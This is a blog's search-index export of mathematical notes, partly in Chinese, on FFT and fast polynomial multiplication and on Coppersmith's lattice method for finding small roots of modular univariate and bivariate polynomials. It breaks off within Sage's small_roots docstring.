(\\omega_n^{n-1})^0\u0026(\\omega_n^{n-1})^1\u0026\\cdots\u0026(\\omega_n^{n-1})^{n-1}\\end{bmatrix} $$ 则 $(\\mathcal{F_{ij}}^{-1})= [x^i] \\prod_{k\\neq j} \\frac{x-\\omega_n^k}{\\omega_n^j-\\omega_n^k}$ . 进一步分析： $$ \\prod_{0 \\le k \\lt n} (x-\\omega_n^k) = x^n -1 $$ 考虑辅助函数 $$ \\begin{aligned} g(x) \u0026= \\frac{\\prod_{0 \\le k \\lt n} (x-\\omega_n^k)}{x - \\omega_n^j} \\\\\\\\ \u0026= \\sum_{0 \\le i \\le n-1} (\\omega_n^{j})^{i}x^{n-1-i} \\end{aligned} $$ 故 $$ \\begin{aligned} \\mathcal{F_{ij}}^{-1} \u0026= [x^i]\\prod_{k\\neq j}\\frac{x-\\omega_n^k}{\\omega_n^j-\\omega_n^k} \\\\\\\\ \u0026= \\frac{[x^i]g(x)}{g(\\omega_n^j)} \\\\\\\\ \u0026= \\frac{(\\omega_n^{-j})^i\\omega_n^{-j}}{n\\omega_n^{-j}}=\\frac{\\omega_n^{-ij}}n \\end{aligned} $$ 展开写作 $$ \\begin{gathered}\\mathcal{F}^{-1}=\\frac1n\\begin{bmatrix}(\\omega_n^{-0})^0\u0026(\\omega_n^{-0})^1\u0026\\cdots\u0026(\\omega_n^{-0})^{n-1} \\\\\\\\ (\\omega_n^{-1})^0\u0026(\\omega_n^{-1})^1\u0026\\cdots\u0026(\\omega_n^{-1})^{n-1} \\\\\\\\ \\vdots\u0026\\vdots\u0026\\ddots\u0026\\vdots \\\\\\\\ (\\omega_n^{-(n-1)})^0\u0026(\\omega_n^{-(n-1)})^1\u0026\\cdots\u0026(\\omega_n^{-(n-1)})^{n-1}\\end{bmatrix}\\end{gathered} $$这就完成了对比分析过程。 上述多少有些 Abuse of notation ，应稍作总结。 ","date":"2024-07-01","objectID":"/waytofft-part-1/:4:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Summary 1. Definition Fourier Transform Matrix $\\mathcal{F}$: $$ \\mathcal{F}_{N} = \\begin{bmatrix} \\omega_N^{0 \\cdot 0} \u0026 \\omega_N^{0 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{0 \\cdot (N-1)} \\\\\\\\ \\omega_N^{1 \\cdot 0} \u0026 \\omega_N^{1 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{1 \\cdot (N-1)} \\\\\\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ \\omega_N^{(N-1) \\cdot 0} \u0026 \\omega_N^{(N-1) \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{(N-1) \\cdot (N-1)} \\end{bmatrix} $$where $\\omega_N = e^{\\frac{2\\pi i}{N}}$ is the $N$-th root of unity. Inverse Fourier Transform Matrix \\(\\mathcal{F}^{-1}\\): $$ \\mathcal{F}^{-1}_{N} = \\frac{1}{N} \\begin{bmatrix} \\omega_N^{-0 \\cdot 0} \u0026 \\omega_N^{-0 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{-0 \\cdot (N-1)} \\\\\\\\ \\omega_N^{-1 \\cdot 0} \u0026 \\omega_N^{-1 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{-1 \\cdot (N-1)} \\\\\\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ \\omega_N^{-(N-1) \\cdot 0} \u0026 \\omega_N^{-(N-1) \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{-(N-1) \\cdot (N-1)} \\end{bmatrix} $$ 一类利用单位根，来做到优化时间复杂度。 2. FFT and IFFT FFT: For a sequence $x_n$, the FFT is defined as: $$ \\text{FFT}(x) = X_k = \\sum_{n=0}^{N-1} x_n \\omega _N^{kn} $$or using matrix notation: $$ X = \\mathcal{F}_{N} x $$where $\\mathcal{F}_{N}$ is the Fourier transform matrix. IFFT: For the sequence $X_k$, the IFFT is given by: $$ x_n = \\frac{1}{N} \\sum_{k=0}^{N-1} X_k \\omega_N^{-kn} $$or using matrix notation: $$ x = \\mathcal{F}^{-1}_{N} X $$where $\\mathcal{F}^{-1}_{N}$ is the inverse Fourier transform matrix。 3. Compact Formula for FFT Using the uniform symbols and subscripts, the FFT formula is: $$ X_k = \\sum_{n=0}^{N-1} x_n \\omega _N^{kn} $$ In matrix form: $$ X = \\mathcal{F}_{N} x $$where $\\mathcal{F}_{N}$ is: $$ \\mathcal{F}_{N} = \\begin{bmatrix} \\omega_N^{0 \\cdot 0} \u0026 \\omega_N^{0 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{0 \\cdot (N-1)} \\\\\\\\ \\omega_N^{1 \\cdot 0} \u0026 \\omega_N^{1 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{1 \\cdot (N-1)} \\\\\\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ \\omega_N^{(N-1) \\cdot 0} \u0026 \\omega_N^{(N-1) \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{(N-1) \\cdot (N-1)} \\end{bmatrix} $$ 4. Compact Formula for IFFT The IFFT formula is: $$ x_n = \\frac{1}{N} \\sum_{k=0}^{N-1} X_k \\omega_N^{-kn} $$ In matrix form: $$ x = \\mathcal{F}^{-1}_{N} X $$where $\\mathcal{F}^{-1}_{N}$ is： $$ \\mathcal{F}^{-1}_{N} = \\frac{1}{N} \\begin{bmatrix} \\omega_N^{-0 \\cdot 0} \u0026 \\omega_N^{-0 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{-0 \\cdot (N-1)} \\\\\\\\ \\omega_N^{-1 \\cdot 0} \u0026 \\omega_N^{-1 \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{-1 \\cdot (N-1)} \\\\\\\\ \\vdots \u0026 \\vdots \u0026 \\ddots \u0026 \\vdots \\\\\\\\ \\omega_N^{-(N-1) \\cdot 0} \u0026 \\omega_N^{-(N-1) \\cdot 1} \u0026 \\cdots \u0026 \\omega_N^{-(N-1) \\cdot (N-1)} \\end{bmatrix} $$ Conclusion FFT: $X = \\mathcal{F}_{N} x$ IFFT: $x = \\mathcal{F_{N}}^{-1} X = \\frac{1}{N} \\mathcal{F_{N}}^{\\dagger} X$ Where $\\mathcal{F_{N}^{\\dagger}}$ denotes the conjugate transpose of $\\mathcal{F_{N}}$. Note that where: $X = [X_0,X_1,…,X_{N-1}]^T$ is the frequency domain representation. $x = [x_0,x_1,…,x_{N-1}]^T$ is the time domain sequence. $\\omega_N = e^{\\frac{2\\pi i}{N}}$ is the $N$-th root of unity. $\\mathcal{F}_N$ is the $N\\times N$ Fourier transform matrix, whose conjugate transpose used for IFFT. ","date":"2024-07-01","objectID":"/waytofft-part-1/:4:1","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Fast polynomial multiplication Fast polynomial multiplication of two polynomials. For two polynomials: $$ \\begin{align}p(x)\u0026= a_0+a_1x+\\cdots+a_{n-1}x^{n-1},\\\\\\\\ q(x)\u0026= b_0+b_1x+\\cdots+b_{n-1}x^{n-1} \\end{align} $$ Their product $$ (p\\cdot q)(x)=p(x)\\cdot q(x)=c_0+c_1x+\\cdots c_{2n-2}x^{2n-2} $$where $$ c_i = \\sum_{\\max \\{0,i-(n-1)\\}\\le k \\le \\min \\{i,n-1\\}} a_k b_{i-k} $$ ","date":"2024-07-01","objectID":"/waytofft-part-1/:5:0","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Algorithm Evaluate $p(x)$ and $q(x)$ at $2n$ points $\\omega_{2n}^0,…,\\omega_{2n}^{2n-1}$ using DFT. Obtain the values of $p(x)q(x)$ at these $2n$ points through pointwise multiplication $$ \\begin{aligned} (p\\cdot q)(\\omega_{2n}^{0})\u0026 =\\quad p(\\omega_{2n}^0)\\cdot q(\\omega_{2n}^0), \\\\\\\\ (p\\cdot q)(\\omega_{2n}^1)\u0026 =\\quad p(\\omega_{2n}^1)\\cdot q(\\omega_{2n}^1), \\\\\\\\ \u0026\\quad\\vdots \\\\\\\\ (p\\cdot q)(\\omega_{2n}^{2n-1})\u0026 =\\quad p(\\omega_{2n}^{2n-1})\\cdot q(\\omega_{2n}^{2n-1}). \\end{aligned} $$ Interpolate the polynomial $p \\cdot q$ at the product values using IDFT to obtain $c_0,..,c_{2n-2}$. 步骤1, 2, 3 对应时间复杂度为 $\\Theta(n\\log n),\\Theta(n),\\Theta(n\\log n).$ 代数角度来看，是利用单位根元素构成的特殊代数结构及其性质完成的策略。 不难联想到，利用 FFT 也可以计算 两向量卷积。 卷积（Convolution）: $$ a = (a_0,...,a_{n-1}) \\quad and\\quad b = (b_0,...,b_{n-1}) $$ 定义卷积所得向量 $c$ $$ c_j = \\sum_{k=0}^j a_k b_{j-k}, j = 0,...,n-1 $$ 时间复杂度也为 $\\Theta(n\\log n)$. Reference Fast polynomial multiplication Polynomial: From FT to NTT Polynomial Multiplication and Fast Fourier Transform (Com S 477/577 Notes) Yan-Bin Jia. Sep 20, 2022 Number Theoretic Transform - CCRMA, Stanford A Complete Beginner Guide to the Number Theoretic Transform (NTT) ","date":"2024-07-01","objectID":"/waytofft-part-1/:5:1","tags":[],"title":"WayToFFT Part 1","uri":"/waytofft-part-1/"},{"categories":[],"content":"Solving Small root for Modular Bivariate Polynomial Coron’s Technique ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:0:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Howgave-Graham’s condition For proof, just recall the inequality we metioned last blog. There is a grace way to proof this. ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:1:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"PROOF: According to lemma 3, we have: $$ \\begin{aligned}\\vert h(x_0,y_0)\\vert \u0026= \\vert \\sum h_{i,j} x_0^i y_0^j \\vert = \\vert \\sum h_{i,j} X^jY^j(x_0/X)^i(y_0/Y)^j \\vert \\\\\\\\ \u0026\\le \\sum \\vert h_{i,j}X^jY^j(x_0/X)^i(y_0/Y)^j \\vert \\\\\\\\ \u0026\\le \\sum \\vert h_{i,j} X^iY^j \\vert \\\\\\\\ \u0026\\le \\sqrt{\\omega}\\Vert h(xX,yY) \\Vert \\lt n \\end{aligned} $$ then given $h(x_0,y_0) \\equiv 0 \\mod n$, we have $h(x_0,y_0) = 0$. The lemma there also descripted as follow: ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:1:1","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Bivariate Integer Polynomials Case After we process the univariate case in last post, now with the similar method , we can also find small root on bivariate polynomial ring under Howgrave’s condition. In the bivariate integer polynomial case, we can utilize a similar approach to the univariate scenario that was covered previously. The key is to leverage Howgrave’s condition to construct a matrix whose linear space forms a lattice. By applying the LLL algorithm to this lattice, we can then obtain a set of polynomials with smaller coefficients that share the same roots. Nevertheless, the bivariate case presents an additional challenge - we need to find two distinct polynomials in order to solve for both variables, $x$ and $y$. The general strategy is as follows: Construct a matrix whose rows correspond to the desired polynomial constraints, taking into account Howgrave’s condition. Apply the LLL algorithm to this matrix to obtain a reduced basis, which will include two or more polynomials with smaller coefficients. Analyze the resulting polynomials to identify a pair that can be used to solve for the values of x and y. This approach allows us to find the small roots of bivariate integer polynomials, under Howgrave’s condition. The most significant problem is the structure of our matrix. For example ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:2:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Coron’s Construction With familiar idea, we gonna set a lattice with a suitable determinant for lattice reduction , this process also reduce our coefficients. ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:3:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Build shift polynomials for our matrix. Set our target with the form below: $$ p(x,y) = \\sum_{0 \\le i, j \\le \\delta} p_{i,j} x^i y^j $$ Obviously, we note the coefficients as $p_{i,j}$. Remember that our goal is to reduce the coefficients to smaller ones in two independent polynomials letting us to find roots directly with resultant or Gröbner basis. With condition given in Howgrave-Graham, we start to build some polynomials. That is: We are looking for an integer root $(x_0,y_0)$ such that $p(x_0,y_0) = 0$ and with the bound $\\vert x_0 \\vert \\le X, \\vert y_0 \\vert \\le Y$. Assumption 1: $p(x,y)$ is irreducible. Of course, if not , just use the factor as new $p(x,y)$. Fact: shift ploynomials share the same root with our target $F(x,y)$ It’s trivial to attention the fact. In Cor[07] we build. $$ S_{a,b}(x,y) = x^a y^b \\cdot p(x,y) ,\\text{for}\\quad 0 \\le a,b \\lt k \\tag1 $$$$ r_{i,j}(x,y) = x^i y^j \\cdot n ,\\text{for}\\quad 0 \\le i,b \\lt k+\\delta \\tag2 $$ Matrix $S$ Let $S$ be the matrix of row vectors obtained by taking the coefficients of the polynomials $S_{a,b}(x,y)$ for $0 \\le a, b \\lt k$, (choose $k \\in \\mathbb{N}$ sufficiently large) and consider the $k^2$ polynomials for which we only consider the monomials $x^{i_0 +i}y^{j_0 +j} \\text{for}\\quad 0 \\le i,j \\lt k$, where the index $(i_0,j_0)$ is given. ( $0 \\le i_0,j_0 \\lt \\delta $). For parameter $n$ in $(1),(2)$: $$ n \\coloneqq \\vert \\det S \\vert $$ Then, let $$ W = \\max_{i,j} \\vert p_{i,j} \\vert X^j Y^j = \\vert p_{uv} \\vert X^u Y^v $$ Proof of this inequality is pretty complex , before that we need to know the purpose of introducing Lemma 2: We are still on the road to find our shift polynomial Assumption 2: $$ XY \\lt W^{2/(3\\delta) -1/k}2^{-9k} $$ This gives $$ \\begin{aligned} W \u0026\\gt (XY)^{\\delta}\\cdot2^{9\\delta^{2}} \\\\\\\\ n \u0026= O(W^{k^2}) \\end{aligned} $$ so that matrix $S$ is invertible. Finally, we can descript our shift polynomial $h(x,y)$ . Let $h(x,y)$ be a linear combination of the polynomials $s_{a,b}(x,y)$ and $r_{i,j}(x,y).$ Since we have that $s_{a,b}(x,y)=0$ mod $n$ for all $a,b$ and $r_{i,j}(x,y)=0 \\mod n$ for all $i,j$,we obtain: $$ h(x_0,y_0)=0 \\mod n. $$The following lemma, due to Howgrave-Graham [13], shows that if the coefficients of polynomial $h(x,y)$ are sufficiently small, then $h(x_0,y_0)=0$ holds over the integers. For a polynomial $h(x,y)=\\sum_{i,j} h_{ij}x^{i} y^{j}$, we define $\\Vert h(x,y) \\Vert ^2:=\\sum_{i,j}\\vert h_{ij}\\vert^2.$ Lattice $L$ We consider the lattice $L$ generated by the row vectors formed with the coefficients of polynomials $s_{a,b}(xX,yY)$ and $r_{i,j}(xX,yY).$ In total, there are $k^2+(k+\\delta)^2$ such polynomials; moreover these polynomials are of maximum degree $\\delta+k-1$ in $x,y$, so they contain at most $(\\delta + k)^2$ coefficients. Let $M$ be the corresponding matrix of row vectors; $M$ is therefore a rectangular matrix with $k^2+(k+\\delta)^2$ rows and $(k+\\delta)^2$ columns (see Figure 2 for an illustration). Observe that the rows of $M$ do not form a basis of $L$ (because there are more rows than columns), but $L$ is a full rank lattice of dimension $(k+\\delta)^2$ (because the row vectors corresponding to polynomials $r_{i,j}(xX,yY)$ form a full rank lattice). With our idea to find $h(x,y)$, we build $M$. Notice that choosing a block in $M$ can done the task easier. Nonetheless, that’s not enough. Sublattice $L_2$ Formally, we choose the sub lattice $L_2$ with $\\omega$ dimensions $$ \\omega \\coloneqq (\\delta+K)^2 -k^2 = \\delta^2 + 2k\\delta $$ A matrix basis for $L_2$ can be obtained by fırst triangularizing $M$ using elementary row operations and then taking the corresponding submatrix (see Figure 3). Now, the exciting moment. Apply LLL to $L_2$! Get a non-zero polynomial $h(x,y)$ that satisfies $h(x_0,y_0) = 0 \\mod n$ and $$ \\Vert h(xX,yY)\\Vert \\leq2^{(\\omega-1)/4}\\cdot\\det(L_2)^{1/\\omega} $$ From H-G bound: if : $$ 2^{(\\omega-1)/4} \\cdot \\det L_2 ^{1/\\omega} \\le \\frac{n}{\\sqrt\\omega} $$ then $h(x_0,y_0) = 0$ holds i","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:3:1","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Compute $\\det L_2$ Mainly algebra, nothing special. Calculating determinant with elementary rows transformation need some bridge matrix for block matrix computation. With our choosing strategy considered, there is a simplified matrix. Let $M^{\\prime}$ be the same matrix as $M$, except that we take the coefficients of polynomials $S_{a,b}(xX,yY)$ and $r_{i,j}(xX,yY)$; matrix $M^{\\prime}$ has $k^2+ (\\delta + k)^2$ rows and $(k+\\delta)^2$ columns. And we remove the $X^i Y^j$ powers. $$ M^{\\prime} = \\begin{bmatrix} S \u0026 T \\\\\\\\ nI_{k^2} \u0026 0 \\\\\\\\ 0 \u0026 nI_{\\omega} \\end{bmatrix} $$ Detail: Matrix $S$ is previously defined square matrix of dimension $k^2$, while $T$ is matrix with $k^2$ rows and $\\omega = k^2 + 2k\\delta$ columns. Let $L^\\prime$ be a lattice generated by the rows of $M^{\\prime}$, in other word , we set $L^{\\prime}$ in the row space of the matrix $M^{\\prime}$, and let $L_2^\\prime$ be the sublattice where all coefficients corresponding to monomials $x^{i+i_0}y^{j+j_0}$ for $0 \\le i, j\\lt k$ are set to zero. Note that lattice $L^{\\prime}$ corresponds to lattice $L$ without the $X^iY^j$ powers, whereas lattice $L_2^\\prime$ corresponds to lattice $L_2$. Note that: $$ S^\\prime \\cdot S = n I_{k^2} $$Namely $S^\\prime$ is (up to sign) the transpose of the co-factor matrix of $S$, verifying $S^\\prime\\cdot S=(\\det S)I_{k^2}.$ of $M^{\\prime}$; this gives the following matrix: $$ M_2'=\\begin{bmatrix}I_{k^2}\u00260\u00260\\\\\\\\-S'\u0026I_{k^2}\u00260\\\\\\\\0\u00260\u0026I_\\omega\\end{bmatrix}\\cdot M'=\\begin{bmatrix}S\u0026T\\\\\\\\0\u0026T'\\\\\\\\0\u0026nI_\\omega\\end{bmatrix} $$where $T^\\prime=-S^{\\prime}\\cdot T$ is a matrix with $k^2$ rows and $\\omega$ columns. By elementary operations on the rows of $M_2^{\\prime}$, we obtain: $$ M_3^{\\prime}=U\\cdot M_2^{\\prime}=\\begin{bmatrix}S\u0026T\\\\\\\\0\u0026T^{\\prime \\prime}\\\\\\\\0 \u0026 0\\end{bmatrix} $$where $T^{\\prime\\prime}$ is a square matrix of dimension $\\omega$. We obtain that $T^{\\prime\\prime}$ is a row matrix basis of lattice $$ \\begin{aligned} \\det L^{\\prime}\u0026=\\vert \\det\\begin{bmatrix}S\u0026T\\\\\\\\0\u0026T''\\end{bmatrix}\\vert \\\\\\\\\u0026=\\vert \\det S\\vert \\cdot\\vert \\det T^{\\prime\\prime}\\vert \\\\\\\\ \u0026=\\vert \\det S\\vert \\cdot\\det L_2^{\\prime}\\\\\\\\ \u0026=n\\cdot\\det L_2^{\\prime}\\end{aligned} \\tag4 $$So our target changes to compute the determinant of $L^{\\prime}$. The polynomial $p(x,y)$ being irreducible, the gcd of its coefficients is equal to $1$. The gcd of the coefficients of $p(x,y)$ being 1 implies that the entries of $M^{\\prime}$ are coprime, which allows for the columns of $M^{\\prime}$ to be transformed through elementary operations into an identity matrix block. This is possible because there are no common factors that restrict the linear combinations needed to zero out entries and simplify the matrix. The unimodular transformation preserves the determinant, ensuring that the fundamental properties of the lattice defined by $M^{\\prime}$ are maintained. $$ M_4^\\prime=M^\\prime\\cdot V=\\begin{bmatrix}I_{k^2}| 0\\\\\\\\nV\\end{bmatrix} $$ By elementary row operations on $M_4^{\\prime}$ based on $V^-1$ we obtain : $$ M_5^{\\prime}=\\begin{bmatrix}I_{k^2}\u00260\\\\\\\\0\u0026V^{-1}\\end{bmatrix}\\cdot M_4'=\\begin{bmatrix}I_{k^2}\u00260\\\\\\\\\u0026nI_{(\\delta+k)^2}\\end{bmatrix}=\\begin{bmatrix}I_{k^2}\u00260\\\\\\\\ nI_{k^2}\u00260\\\\\\\\0\u0026nI_\\omega\\end{bmatrix} $$$$ M_6^{\\prime}= U^\\prime \\cdot M_5^{\\prime}=\\begin{bmatrix}I_{k^2}\u00260 \\\\\\\\ 0 \u0026 n I_\\omega \\\\\\\\ 0\u00260\\end{bmatrix} $$$$ \\det L'=\\det\\begin{bmatrix}I_{k^2}\u00260 \\\\\\\\ 0\u0026nI_\\omega\\end{bmatrix}=n^\\omega \\tag5 $$Combining equations $(4)$ and $(5)$, we obtain: $$ \\det L_2'=n^{\\omega-1} $$ Finally we can recover $\\det L_2$ from $\\det L_2^\\prime$: $$ \\begin{align} \\det L_2\u0026=\\det L_2^{\\prime}\\cdot\\frac{\\prod\\limits_{0\\leq i,j\u003c\\delta+k}X^iY^j}{\\prod\\limits_{0\\leq i,j","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:3:2","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Summary As usual we consider shifts of the polynomial $F(x, y)$. Choose $k\\in\\mathbb{N}$ (sufficiently large) and consider the $k^{2}$ polynomials. $$ s_{a,b}(x,y)=x^a y^b F(x,y)\\quad\\mathrm{for}\\quad 0\\leq a,b","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:3:3","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"Appendix See in references for an example. The proof of lemma 2 can be found in the appendix of Cor[07]. ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:4:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"References Course PPT Multivariate Coppersmtih-19.2 Introduction How to Represent Bivariate Polynomial Ring Polynomial and an ideal https://github.com/ubuntor/coppersmith-algorithm.git Coron jochemsz-may ","date":"2024-06-04","objectID":"/waytocoppersmith0x01/:5:0","tags":[],"title":"WayToCoppersmith0x01","uri":"/waytocoppersmith0x01/"},{"categories":[],"content":"RE:从零开始的crypto生活 模多项式求根问题 被认为计算困难的方程: $$ p(x)=0\\left(\\operatorname{mod}N\\right); $$在Zmod(N)的环下求解整数根。 $$ p(x,y)=0 \\pmod{N} $$ 对于多变量多项式在Zmod(N)的环下求解一组整数根。 Coppersmith’s Method ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:0:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"概述 针对这样的思路，可以在格规约、移位多项式和求解common root等几个过程做优化，从而达到提升bound、加快规约速度等目的。Sagemath 中集成了这一方式，但我们也可以手动修改其中过程，以满足需要。 一般的Howgrave-Graham给出: 即，当给定一个上界 $X = N$ ,如果一个根 $x_0 \\lt X$ ，那么我们当该多项式在整数环上时，$f(x_0)=0$ 依然成立。 这一引理通常被记为 Howgrave-Graham[22], 或 Hastad[19] 涉及范数证明的命题，时常会让我们想起柯西不等式，进而导出$l_1$范数和$l_2$范数间的关系。 为了更好理解，证明命题的功课时常不能忽略。 ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:1:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"$l_1$ 和 $l_2$ 范数之间的关系 (编写公式，为了方便没有切换输入法) Norm Relationships and Cauchy-Schwarz Inequality For a vector $a=(a_1,\\dots,a_n)$,then $l_1$-norm and the $l_2$-norm are defined as: $$\\Vert \\mathbf{a}\\Vert_1 =\\sum_{i=1}^{i} |a_i| \\quad\\mathrm{and}\\quad \\Vert\\mathbf{a}\\Vert_2=\\left(\\sum_{i=1}^{n}|a_{i}|^2\\right)^{1/2}.$$The $l_1$-norm is generally larger than the $l_2$-norm, and they are related by: $$\\|\\mathbf{a}\\|_1\\leq\\sqrt{n}\\|\\mathbf{a}\\|_2.$$ This relationship can be derived from the Cauchy-Schwarz inequality. Cauchy-Schwarz Inequality: The Cauchy-Schwarz inequality states that for any vectors a and b in $\\mathbb{R}^n:$ $$ \\left(\\sum_{i=1}^na_ib_i\\right)^2\\leq\\left(\\sum_{i=1}^na_i^2\\right)\\left(\\sum_{i=1}^nb_i^2\\right). $$ If we take b to be a vector of ones, $\\mathbf{b}=(1,1,\\ldots,1)$,we get: $$ \\left(\\sum_{i=1}^na_i\\right)^2\\leq n\\left(\\sum_{i=1}^na_i^2\\right). $$ Taking the square root of both sides gives us the desired relationship: $$ \\sum_{i=1}^n|a_i|\\leq\\sqrt{n}\\left(\\sum_{i=1}^n|a_i|^2\\right)^{1/2}. $$ Applying This to the Problem In the howgrave’s case,we are dealing with a polynomial $g(x)=\\sum c_ix^i.$ The key steps in the inequality chain are: Bounding the Polynomial’s Value: $$ |g(x_0)|=\\left|\\sum_ic_ix_0^i\\right|\\leq\\sum_i|c_ix_0^i|. $$ Introducing a Bound on $x_0$: $$ \\sum_i|c_ix_0^i|\\leq\\sum_i|c_i|X^i $$ where $x_0 \\le X$. $$ \\sum_i|c_i|X^i = \\sum_i|c_iX^i| \\le\\sqrt{n} \\left(\\sum_i |c_i X^i| \\right )^{1/2}= \\sqrt{n} \\| g(xX)\\| \\lt N^m $$ Here,$g(xX)=\\sum c_i (xX)^i$. ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:2:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"与 Lattice 的关系 在前面我们完成了两个条件的初步解释： Property 2 表明 $$ |g(x_0)| \\lt N^m $$ 结合 Property 1 , 不难得出 $g(x_0)=0$ 的结论。 在此基础上，选定整数 $m \\in \\mathbb{Z}$ ,可以注意到存在这样的线性组合： $$ h_{i,j}=x^jN^if^{m-i}(x). $$ 所得的 $h_{i,j}$ 均满足 $h_{i,j}(x_0)=0 \\mod N^m$. Lattice 出现: 用系数向量 $h_i$ 唯一标识 $h_{i,j}(x)$ 。 Regev 讲义的 intro 部分在定义 lattice 时，将其写为一种线性组合： 而在此处，$h_{i,j}$ 的线性组合也可构成 Lattice. $$\\mathcal{L} (h_{0},\\dots,h_i) = \\set{\\sum x_i h_i\\mid x\\in\\mathbb{Z}}$$更为重要的是，在注意到我们定义的格$\\mathcal{L}$中，短向量与系数均相对较小的多项式 $g(x)$ 一一对应，那么考虑到 Howgrave-Graham[22] 的形式，从直觉上可以考虑在短向量上应用这一引理，从而得到一个满足条件的小根 $x_0$： $$ g(x_0)=0\\mathrm{~mod~}N^m\\mathrm{~and~}|g(x_0)|","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:3:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"Enabling Condition $$ \\det(\\mathcal{L}) \\le N^{mn} $$这一条件可用于优化$X$.接下来要详细的考虑如何构建这个Lattice $\\mathcal{L}$ Speaking Mathematically 首先关注如何构造 $h_{i,j}(x)$ : 选取 $m \\approx \\frac{\\log N}{\\delta} $ $$ h_{i,j}(x)=x^jN^if(x)^{m-i}\\mathrm{~for~}0\\leq i","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:4:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"$c$ $c$ 的引入是为了提高 $X$ 的上界。 这里直接考虑对 $N$ 处理 对于区间 $[-cN^{1/\\delta},cN^{1/\\delta}]$ ,直接考虑分为 $c$ 个大小为 $2N^{1/\\delta}$ 的子区间，这样的子区间符合前文讨论的初等情况,那么运行 $c$ 次，便可以找出这个较大区间内的所有符合条件的根。 ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:5:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"$\\beta$ 指数变换： 直接应用 $N$ 的一个较小因子而非 $N$ 本身,可以在时间复杂度上 ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:6:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"$\\epsilon$ 一类特殊情况下的分析，引入了 $\\epsilon$ . 由于更换了参考文献，符号有所更改. $M = N,d= \\delta$ 其他保持一致即可。 不难发现, $\\frac{1}{2}N^{\\frac{1}{d}-\\epsilon}$ 相对于 $cN^{\\frac{\\beta^2}{\\delta}}$ 的形式，这里给出了 $c=\\frac{1}{2},\\beta = 1$, 又在 $\\beta$ 其后增加了 $-\\epsilon$ . 同时给定了限制： $$ 0 \\lt \\epsilon \\lt \\min\\{0.18, 1/d\\} $$ 证明到这里已经写明所引参数 $h$ 同待证明命题参数 $\\epsilon$ , 而此时可以考虑应用条件 $X \\lt \\frac{1}{2}M^{1/d -\\epsilon}$ . 进一步的，在实际参数中引入了 $m,t$ 来控制移位多项式，来构建 $\\mathcal{L}$ . 具体可参见所附代码. ","date":"2024-05-26","objectID":"/waytocoppersmith-0x00/:7:0","tags":[],"title":"WayToCoppersmith0x00","uri":"/waytocoppersmith-0x00/"},{"categories":[],"content":"Open problem 至此，单变量的coppersmith求解小根问题的思考可以完美落幕。而格的优化亦或是求解公共根时的算法更改又是另一个新的问题了。 small_root in sage def small_roots(self, X=None, beta=1.0, epsilon=None, **kwds): \"\"\" Let `N` be the characteristic of the base ring this polynomial is defined over: ``N = self.base_ring().characteristic()``. This method returns small roots of this polynomial modulo some factor `b` of `N` with the constraint that `b \u003e= N^\\beta`. Small in this context means that if `x` is a root of `f` modulo `b` then `|x| \u003c X`. This `X` is either provided by the user or the maximum `X` is chosen such that this algorithm terminates in polynomial time. If `X` is chosen automatically it 